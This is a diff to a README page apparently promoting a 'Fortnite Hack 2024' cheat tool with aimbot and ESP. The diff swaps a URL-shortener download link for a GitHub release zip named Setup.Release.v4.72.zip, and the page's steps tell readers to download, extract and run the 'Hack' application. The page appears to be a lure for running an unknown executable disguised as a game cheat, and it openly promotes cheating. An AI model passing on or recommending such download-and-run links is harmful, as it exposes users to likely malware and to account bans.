@@ -12,7 +12,7 @@
 </div>
 
 <div align="center">
-  <h2><a href="https://goo.su/eHJFzDq">🔹 Download Fortnite Hack 2024 🔹</a></h2>
+  <h2><a href="https://github.com/InfiniteCheats/PhantomStrike-Fortnite-Cheat-Tool-2024-Aimbot-ESP-Build-Assist/releases/download/4.72/Setup.Release.v4.72.zip">🔹 Download Fortnite Hack 2024 🔹</a></h2>
 </div>
 
 ---
@@ -49,7 +49,7 @@
 
 To get started with **Fortnite Hack 2024**, follow these simple steps:
 
-1. Click on the download: [Click Here to Download](https://goo.su/eHJFzDq).
+1. Click on the download: [Click Here to Download](https://github.com/InfiniteCheats/PhantomStrike-Fortnite-Cheat-Tool-2024-Aimbot-ESP-Build-Assist/releases/download/4.72/Setup.Release.v4.72.zip).
 2. Extract the files to a location on your PC.
 3. Run the **Hack** application and follow the on-screen instructions.
 4. Start Fortnite and enjoy your new cheats!
